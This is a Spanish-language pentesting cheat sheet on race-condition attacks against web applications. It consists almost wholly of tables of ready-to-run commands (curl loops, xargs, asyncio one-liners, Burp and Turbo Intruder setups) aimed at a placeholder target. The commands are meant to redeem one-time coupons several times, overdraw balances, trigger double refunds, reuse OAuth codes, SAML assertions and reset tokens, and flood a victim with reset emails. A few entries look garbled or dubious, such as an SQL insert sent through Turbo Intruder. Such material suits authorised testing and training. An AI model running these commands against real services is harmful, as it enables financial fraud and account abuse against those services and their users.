---
aliases:
  - Race Bypass
  - DB Isolation Race
  - Distributed Race
tags:
  - type/technique
  - vuln/race-condition
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Race Conditions]]'
---
# Race Conditions - Bypasses y Edge Cases

***

## Lock Contention Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Turbo Intruder script `engine.queue(req)` x 30 con `concurrentConnections=1, engine=Engine.BURP2` | Single-packet race lock acquire window | TOCTOU lock check. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "action=acquire&resource=R1" https://target/api/lock &); done; wait` | Bash parallel acquire lock race | DIY lock race. |
| Burp Repeater group con 20 tabs all "POST /api/lock acquire" → "Send group single connection" | Burp acquire flood race | Lock window. |
| `python3 -c "import asyncio,aiohttp; asyncio.run((lambda:(lambda s: asyncio.gather(*[s.post('https://target/api/lock',json={'r':'R1'}) for _ in range(50)]))(aiohttp.ClientSession()))())"` | asyncio 50 parallel acquire | Async race. |
| `redis-cli SET lock:R1 attacker NX PX 100 && curl -X POST -b "session=X" -d "..." https://target/api/action` | Redis SETNX TTL window exploit (TTL too short) | Distributed lock TTL. |
| Turbo Intruder script `engine.queue(req_acquire); engine.queue(req_release); engine.queue(req_acquire)` interleaved | Acquire/release/acquire race CAS bypass | CAS bypass. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "action=transfer&from=A&to=B&amount=100" https://target/api/transaction &); done; wait` | Optimistic lock retry abuse — version conflict race | Optimistic lock retry. |
| Burp Intruder Cluster Bomb con 2 payloads (acquire/release) x 50 threads | Lock state churn race | Reentrant lock. |
| `python3 race_lock_skip.py` (with `try_lock` skip path probe) | Try-lock skip race | Try-lock race. |
| `seq 1 30 \| xargs -P 30 -I{} curl -X PATCH -b "session=X" -d '{"version":1,"value":"new"}' https://target/api/resource/R1` | Multi-row atomic update race | Multi-resource race. |
| Wireshark filter `tcp.port==6379` capture Redis SETNX traffic | Capture lock state for analysis | Redis-specific debug. |
^race-bypass-lock

___

## Database Isolation Level Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Turbo Intruder `engine.queue(req)` x 20 con `concurrentConnections=1, engine=Engine.BURP2` (READ COMMITTED app) | Lost update race default Postgres/MySQL isolation | Standard lost update. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "amount=50&from=A&to=B" https://target/api/transfer &); done; wait` | Bash parallel withdraw — lost update | Banking race. |
| `seq 1 30 \| xargs -P 30 -I{} curl -X POST -b "session=X" -d "coupon=ONCEONLY" https://target/api/redeem` | Single-use coupon race redeem multiple | Coupon abuse. |
| `python3 -c "import asyncio,aiohttp; asyncio.run((lambda: asyncio.gather(*[aiohttp.ClientSession().post('https://target/api/inventory/reserve',json={'item_id':1}) for _ in range(50)]))())"` | Inventory reservation race | Inventory race. |
| Turbo Intruder script con `concurrentConnections=1, engine=Engine.BURP2` + `req` x 30 (`INSERT INTO users SELECT FROM unique_email`) | Unique constraint race insert | Unique index race. |
| `psql -h target -U postgres -c "SHOW default_transaction_isolation"` (recon) | Identify default isolation level | Pre-attack DB recon. |
| `curl -X POST -b "session=X" -d "amount=100&from=A&to=B" https://target/api/transfer` x 20 con HTTP/2 single packet | Same logical user concurrent transfer | Account balance race. |
| Burp Repeater group: 30 tabs `POST /api/orders/create item=X` → Send group single connection | Order create race for race-bound stock | Stock race. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "amount=1000" https://target/api/withdraw &); done; wait` | Withdraw race vs balance check | Phantom read exploit. |
| Burp Repeater single-packet send con `INSERT` + `SELECT` interleaved | MVCC snapshot pre-write race | Snapshot isolation gap. |
| `python3 race_cascade.py` (concurrent parent DELETE + child INSERT) | Cascade delete race orphan rows | Cascade race. |
| `psql ... -c "BEGIN; SELECT * FROM x FOR UPDATE SKIP LOCKED; ..."` (server-side test) | SKIP LOCKED row bypass | DB-level workflow. |
^race-bypass-db-isolation

### Lost update example

```sql
-- Transaction 1 (User A)
BEGIN;
SELECT balance FROM accounts WHERE id=1; -- balance = 100
-- ... business logic ...
UPDATE accounts SET balance = 100 - 50 WHERE id=1; -- balance = 50
COMMIT;

-- Transaction 2 (User A simultáneamente)
BEGIN;
SELECT balance FROM accounts WHERE id=1; -- balance = 100 (still!)
-- ... business logic ...
UPDATE accounts SET balance = 100 - 30 WHERE id=1; -- balance = 70
COMMIT;

-- Final: balance = 70 (NOT 20 expected) — lost the 50 deduction
```

___

## Compensation Transaction Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for i in {1..30}; do (curl -X POST -b "session=X" -H "Idempotency-Key: $(uuidgen)" -d "amount=100" https://target/api/transfer &); done; wait` | Idempotency key race — different keys, same action | Idempotency bypass. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -H "Idempotency-Key: SAME-KEY" -d "amount=100" https://target/api/transfer &); done; wait` | Same idempotency key race — process twice before dedupe | Idempotency dedupe race. |
| Turbo Intruder `engine.queue(req_purchase); engine.queue(req_refund); engine.queue(req_purchase)` interleaved single-packet | Purchase/refund/purchase race — saga compensation bug | Saga race. |
| `curl -X POST -b "session=X" -d "order_id=$OID&reason=cancel" https://target/api/refund` x 30 parallel | Double refund race | Compensation double. |
| `python3 -c "import asyncio,aiohttp; asyncio.run((lambda: asyncio.gather(*[aiohttp.ClientSession().post('https://target/api/refund',json={'order_id':1}) for _ in range(50)]))())"` | asyncio refund flood | Refund race. |
| Wireshark filter `kafka` or `rabbitmq` capture outbox events | Capture outbox events pre-DB commit | Outbox pattern debug. |
| `curl -X POST -b "session=X" -d "txn_id=$TID&action=confirm" https://target/api/saga/confirm` con timing race | 2PC coordinator timeout race | 2PC race. |
| Burp Repeater group con `POST /try`, `POST /confirm`, `POST /cancel` interleaved | TCC race breaks Try-Confirm-Cancel invariant | TCC race. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "to=victim@email.com&template=password_reset" https://target/api/send-email &); done; wait` | Email send race — already sent compensation fail | External side-effect race. |
| `redis-cli MONITOR \| grep idempotency:` | Live Redis monitor for idempotency keys | Dedupe debug. |
| `curl -X POST -b "session=X" -d "action=submit" https://target/api/order` con DB rollback race | Pre-commit event publish race | Outbox pre-commit. |
^race-bypass-compensation

___

## Distributed System Races

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -b "session=X" -d "amount=100" https://us-east.target.com/api/withdraw && curl -X POST -b "session=X" -d "amount=100" https://eu-west.target.com/api/withdraw` | Multi-region withdraw race | Geographic replication lag. |
| `for region in us-east us-west eu-west ap-south; do (curl -X POST -b "session=X" -d "amount=100" https://$region.target.com/api/withdraw &); done; wait` | Multi-region parallel race | Per-region state. |
| `python3 -c "import asyncio,aiohttp; asyncio.run((lambda: asyncio.gather(*[aiohttp.ClientSession().post(f'https://{r}.target.com/api/withdraw',json={'amount':100}) for r in ['us-east','eu-west','ap-south']]))())"` | asyncio multi-region race | Async multi-region. |
| `curl -X POST -b "session=X" -d "value=NEW" https://target/api/write` luego inmediato `curl -b "session=X" https://target/api/read` (replica) | Read-after-write race (replication lag exploit) | Replication lag. |
| `curl -X POST -b "session=X" -d "value=NEW" https://target/api/write && curl -X DELETE -b "session=X" https://target/api/cache/key` (cache pre-DB commit) | Dual-write inconsistency race | DB+cache desync. |
| Kafka console: `kafka-console-producer --topic events` con messages out-of-order | Force out-of-order event delivery | Event ordering. |
| `redis-cli PUBLISH events 'msg1' && redis-cli PUBLISH events 'msg1'` (replay) | At-least-once dedupe race | Dedup race. |
| `dig +short @1.1.1.1 target.com && dig +short @8.8.8.8 target.com` (compare DNS resolvers) | DNS TTL race between resolvers | DNS-level. |
| `curl --resolve target.com:443:1.2.3.4 https://target.com/api/x && curl --resolve target.com:443:5.6.7.8 https://target.com/api/x` | Force different IPs race | Multi-endpoint race. |
| `for i in {1..30}; do (curl -X POST -b "session=X" -d "..." -H "X-Region: us-east" https://target/api/x &); done; wait` | Header-routed multi-region race | Routing race. |
| `aws s3api put-object --bucket b --key k --body f1.txt && aws s3api put-object --bucket b --key k --body f2.txt` (S3 write race) | S3 eventual consistency race | Storage eventual consistency. |
| `istioctl proxy-status` (capture mesh state during race) | Istio proxy state debug during race | Service mesh debug. |
^race-bypass-distributed

___

## Edge Cases

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "import asyncio,aioquic; ..." con HTTP/3 client x 30 streams` | HTTP/3 QUIC stream race | Modern HTTP/3. |
| `wscat -c wss://target/ws -x '{"action":"transfer","amount":100}' -x '{"action":"transfer","amount":100}' ...` (multi-message) | WebSocket parallel messages race | WS race. |
| `curl -X POST -H "Content-Type: application/json" -d '{"query":"mutation { a1: transfer(amount:100), a2: transfer(amount:100), a3: transfer(amount:100) }"}' https://target/graphql` | GraphQL aliased mutations race | GraphQL combo. |
| `python3 race_graphql.py` (con `[transfer(amount:100), transfer(amount:100), ...]` x 30 aliases) | GraphQL alias mass race | GraphQL race. |
| `for i in {1..30}; do (curl -X POST -d @webhook.json https://target/api/webhook/incoming &); done; wait` | Webhook callback race | Webhook race. |
| `curl https://target/reset?token=$ONESHOT && curl https://target/reset?token=$ONESHOT` parallel via xargs | Single-use reset link race | One-shot link race. |
| `for i in {1..10}; do (curl -X POST -d "code=$OAUTH_CODE&grant_type=authorization_code" https://target/oauth/token &); done; wait` | OAuth single-use code race exchange | OAuth code race. |
| `for i in {1..10}; do (curl -X POST -d "SAMLResponse=$ASSERTION" https://target/saml/acs &); done; wait` | SAML single-use assertion race | SAML race. |
| Turbo Intruder script con `req_create_user` + `req_provision_admin` interleaved | SCIM provisioning race | Identity race. |
| `curl -X POST -d "captcha_token=$TOKEN" https://target/api/x` x 20 parallel within captcha window | Captcha valid window race | Captcha race. |
| `curl -X POST -d "device_token=$T&action=transfer" https://target/api/push-confirm` x 20 parallel | Mobile push notification race | Mobile race. |
| Burp Repeater group con `mobile_app /api/x` + `web /api/x` tabs single-connection | Multi-device same-account race | Multi-device race. |
| `curl -X POST -b "session=X" -d "amount=100" https://target/api/transfer` from web + `curl ... mobile.target.com` simultáneo | Web vs mobile concurrent race | Multi-platform race. |
^race-bypass-edge

***
